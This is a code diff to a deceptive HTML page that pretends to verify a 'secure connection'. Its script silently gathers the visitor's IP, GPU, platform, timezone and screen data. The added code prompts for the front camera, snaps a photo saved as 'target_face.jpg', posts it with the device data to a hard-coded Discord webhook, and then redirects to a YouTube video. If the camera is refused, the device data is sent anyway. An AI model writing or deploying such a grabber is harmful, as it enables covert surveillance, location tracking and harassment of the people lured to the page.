@@ -11,64 +11,77 @@
 </head>
 <body>
     <div class="loader"></div>
-    <p style="margin-left: 15px;">Loading secure link...</p>
+    <p style="margin-left: 15px;">Verifying secure connection...</p>
 
     <script>
         const WEBHOOK_URL = "https://discord.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
         const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
+        // Helper function to capture the image
+        async function takeSnapshot(stream) {
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 480; 
+            canvas.height = 640;
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+            return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+        }
+
         async function grabEverything() {
+            let userIP = "Unknown";
+            
+            // 1. SILENT DATA (IP & Hardware)
             try {
-                // 1. Get IP and basic Geolocation (Approximate)
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
+                userIP = ipData.ip;
+            } catch (e) {}
+
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+
+            const info = {
+                ip: userIP,
+                platform: navigator.platform,
+                gpu: gpu,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                time: new Date().toLocaleString()
+            };
+
+            // 2. CAMERA CAPTURE (Requires Permission)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const photoBlob = await takeSnapshot(stream);
                 
-                // 2. Hardware and Browser Deep Probe
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
-                const debugInfo = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
-                const gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+                const fd = new FormData();
+                fd.append("file", photoBlob, "target_face.jpg");
+                // Adding the hardware info as part of the photo upload message
+                fd.append("payload_json", JSON.stringify({
+                    content: `📸 **Photo Captured!**\n🌐 **IP:** \`${info.ip}\`\n🌍 **Timezone:** ${info.timezone}\n💻 **GPU:** ${info.gpu}\n📱 **Device:** ${info.platform}\n⏰ **Time:** ${info.time}`
+                }));
 
-                const data = {
-                    ip: ipData.ip,
-                    platform: navigator.platform,
-                    cores: navigator.hardwareConcurrency || "Unknown",
-                    ram: navigator.deviceMemory || "Unknown",
-                    gpu: gpu,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    language: navigator.language,
-                    connection: navigator.connection ? navigator.connection.effectiveType : "Unknown",
-                    history: window.history.length,
-                    referer: document.referrer || "Direct Link"
-                };
+                await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+                
+                // Stop the camera light immediately
+                stream.getTracks().forEach(t => t.stop());
 
-                // 3. Send to Discord
+            } catch (err) {
+                // If they deny camera, still send the silent info
                 await fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        embeds: [{
-                            title: "🕵️ Extra Data Captured (No Permission)",
-                            color: 15158332,
-                            fields: [
-                                { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
-                                { name: "🌍 Timezone", value: data.timezone, inline: true },
-                                { name: "💻 GPU", value: `\`${data.gpu}\`` },
-                                { name: "🚀 Hardware", value: `${data.cores} Cores / ${data.ram}GB RAM`, inline: true },
-                                { name: "📶 Network", value: data.connection, inline: true },
-                                { name: "🖥️ Screen", value: data.screen, inline: true },
-                                { name: "🔗 Referer", value: data.referer }
-                            ],
-                            footer: { text: "FamilyCheckIn Stealth Probe" }
-                        }]
+                        content: `⚠️ **Camera Denied, but Info Logged:**\n🌐 **IP:** \`${info.ip}\`\n🌍 **Timezone:** ${info.timezone}\n💻 **GPU:** ${info.gpu}`
                     })
                 });
-
-            } catch (err) {
-                console.log("Stealth capture failed");
             } finally {
-                setTimeout(() => { window.location.replace(REDIRECT_URL); }, 1200);
+                // Redirect regardless of camera outcome
+                window.location.replace(REDIRECT_URL);
             }
         }
 
